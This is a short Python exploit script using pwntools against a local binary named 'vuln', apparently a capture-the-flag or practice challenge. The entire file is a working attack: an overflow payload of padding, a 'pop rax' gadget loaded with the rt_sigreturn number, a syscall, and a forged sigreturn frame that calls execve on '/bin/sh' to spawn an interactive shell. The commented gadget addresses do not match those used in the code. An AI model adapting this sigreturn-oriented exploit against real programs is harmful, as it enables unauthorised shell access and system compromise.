from pwn import *


elf = context.binary = ELF("./vuln")


# 0x0000000010000015 : syscall
# 0x0000000010000018 : pop rax ; ret
# 0x000000001000001a : pop rdi ; ret
# 0x000000001000001e : pop rdx ; ret
# 0x000000001000001c : pop rsi ; ret

syscall = 0x0000000000041015
pop_rax = 0x0000000000041018
binsh = elf.address + 0x1238 


s = SigreturnFrame()
s.rax = 0x3b
s.rdi = binsh
s.rsi = 0
s.rdx = 0
s.rip = syscall


payload = flat([
    8 * b"A",
    pop_rax,
    0x0f,
    syscall,
    bytes(s)
])


p = process()
p.sendline(payload)
p.interactive()